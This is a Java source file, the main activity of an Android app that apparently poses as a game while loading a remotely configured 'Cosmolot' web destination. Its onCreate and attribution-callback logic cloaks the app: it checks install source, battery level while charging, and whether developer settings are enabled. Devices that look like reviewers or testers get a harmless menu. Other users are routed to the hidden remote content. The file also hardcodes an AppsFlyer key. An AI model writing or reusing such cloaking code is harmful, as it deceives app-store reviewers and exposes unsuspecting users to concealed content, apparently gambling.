package cos.mol.ott;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.cosmos.lot.R;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private ImageView load;
    private Initialization init;
    private TochkaBuilder tb;
    private FastSaver fs;
    private Advertise ad;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        load = (ImageView)findViewById(R.id.load);
        Glide.with(this).load(R.drawable.loader).into(load);

        init = new Initialization(this);
        fs = new FastSaver(this);
        ad = new Advertise(this);
        ad.start();

        if(!fs.getLaunch()) {
            if (!fs.getTochka().isEmpty()) {
                startActivity(new Intent(MainActivity.this, Cosmos.class));
                finish();
            } else {
                startActivity(new Intent(MainActivity.this, MenuActivity.class));
                finish();
            }
        }else{
            if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null) {
                startActivity(new Intent(MainActivity.this, MenuActivity.class));
                finish();
            } else {
                init.start();
                initAppsFlyer();
            }
        }
    }

    public void initAppsFlyer(){
        AppsFlyerLib.getInstance().init("vKCT9JJNGFPjGDDdE4Lx3H", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                if (fs.getFlyer()) {
                    FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                    FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                            .setMinimumFetchIntervalInSeconds(3600)
                            .build();
                    firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                    firebaseRemoteConfig.fetchAndActivate()
                            .addOnCompleteListener(MainActivity.this, task -> {
                                try {
                                    String gameString = firebaseRemoteConfig.getValue("Cosmolotsatmosphere").asString();
                                    JSONObject data = new JSONObject(gameString);
                                    JSONObject jsonObject = new JSONObject(conversionData);
                                    if (jsonObject.optString("af_status").equals("Non-organic")) {
                                        String campaign = jsonObject.optString("campaign");
                                        if (campaign.isEmpty() || campaign.equals("null")) campaign = jsonObject.optString("c");
                                        String[] splitsCampaign = campaign.split("_");
                                        try{
                                            OneSignal.sendTag("user_id", splitsCampaign[2]);
                                        }catch(Exception e){ }
                                        try{
                                            OneSignal.sendTag("g_id", fs.getAd());
                                        }catch(Exception e){ }
                                        tb = new TochkaBuilder(MainActivity.this, data.optString("cosmolot2") , campaign, AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()), fs.getAd());
                                        startActivity(new Intent(MainActivity.this, Cosmos.class));
                                        finish();
                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                    } else if (jsonObject.optString("af_status").equals("Organic")) {
                                        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                                        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                        if (((batLevel == 100 || batLevel == 90) && isPhonePluggedIn()) || (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                                                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0)) {
                                            fs.setTochka("");
                                            startActivity(new Intent(MainActivity.this, MenuActivity.class));
                                            finish();
                                            AppsFlyerLib.getInstance().unregisterConversionListener();
                                        } else {
                                            try{
                                                OneSignal.sendTag("g_id", fs.getAd());
                                            }catch(Exception e){ }
                                            try{
                                                OneSignal.sendTag("user_id", null);
                                            }catch(Exception e){ }
                                            tb = new TochkaBuilder(MainActivity.this, data.optString("cosmolot2") , "null", AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()), fs.getAd());
                                            startActivity(new Intent(MainActivity.this, Cosmos.class));
                                            finish();
                                            AppsFlyerLib.getInstance().unregisterConversionListener();
                                        }
                                    } else {
                                        fs.setTochka("");
                                        startActivity(new Intent(MainActivity.this, MenuActivity.class));
                                        finish();
                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                    }
                                    fs.setFlyer(false);
                                    fs.setLaunch(false);
                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                } catch (Exception ex) {
                                }
                            });
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
    }

    public boolean isPhonePluggedIn() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        return batteryCharge || usbCharge || acCharge;

    }
}